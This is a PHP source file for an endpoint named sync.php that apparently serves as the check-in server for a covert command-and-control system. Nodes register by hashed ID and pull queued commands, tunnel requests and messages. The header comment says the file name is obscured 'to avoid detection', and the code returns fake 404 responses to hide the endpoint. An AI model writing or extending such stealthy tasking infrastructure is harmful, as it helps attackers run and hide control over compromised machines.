<?php
/**
 * sync.php - Node heartbeat/check-in endpoint
 * Obscured name to avoid detection
 */

require_once __DIR__ . '/config.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    send404();
}

$validated = validateRequest();
$db = getDB();

if (!$db) {
    sendJSON(['error' => 'Service unavailable'], 503);
}

try {
    $nodeId = $validated['node_id'];
    $body = $validated['body'];
    
    // Get node by node_id_hash
    $stmt = $db->prepare("SELECT id FROM nodes WHERE node_id_hash = ?");
    $stmt->execute([$nodeId]);
    $node = $stmt->fetch();
    
    if (!$node) {
        // Create new node if it doesn't exist
        $hostname = $body['hostname'] ?? 'unknown';
        $customName = $body['custom_name'] ?? null;
        
        $insertStmt = $db->prepare("
            INSERT INTO nodes (hostname, custom_name, node_id_hash, last_heartbeat, status)
            VALUES (?, ?, ?, NOW(), 'active')
        ");
        $insertStmt->execute([$hostname, $customName, $nodeId]);
        $nodeIdInt = $db->lastInsertId();
    } else {
        // Update existing node
        $updateStmt = $db->prepare("
            UPDATE nodes 
            SET last_heartbeat = NOW(), status = 'active', updated_at = NOW()
            WHERE id = ?
        ");
        $updateStmt->execute([$node['id']]);
        $nodeIdInt = $node['id'];
    }
    
    // Get pending commands
    $cmdStmt = $db->prepare("
        SELECT id, command, created_at
        FROM commands
        WHERE node_id = ? AND status = 'pending'
        AND (expires_at IS NULL OR expires_at > NOW())
        ORDER BY created_at ASC
        LIMIT 10
    ");
    $cmdStmt->execute([$nodeIdInt]);
    $commands = $cmdStmt->fetchAll();
    
    // Get pending tunnel requests
    $tunnelStmt = $db->prepare("
        SELECT id, source_node_id, local_port, remote_port, created_at
        FROM tunnels
        WHERE target_node_id = ? AND status = 'pending'
        AND (expires_at IS NULL OR expires_at > NOW())
        ORDER BY created_at ASC
        LIMIT 10
    ");
    $tunnelStmt->execute([$nodeIdInt]);
    $tunnels = $tunnelStmt->fetchAll();
    
    // Get unread messages
    $msgStmt = $db->prepare("
        SELECT id, from_node_id, message, created_at
        FROM messages
        WHERE to_node_id = ? AND is_read = FALSE
        AND (expires_at IS NULL OR expires_at > NOW())
        ORDER BY created_at ASC
    ");
    $msgStmt->execute([$nodeIdInt]);
    $messages = $msgStmt->fetchAll();
    
    sendJSON([
        'status' => 'ok',
        'commands' => $commands,
        'tunnels' => $tunnels,
        'messages' => $messages
    ]);
    
} catch (PDOException $e) {
    error_log("Sync error: " . $e->getMessage());
    send404();
}

?>

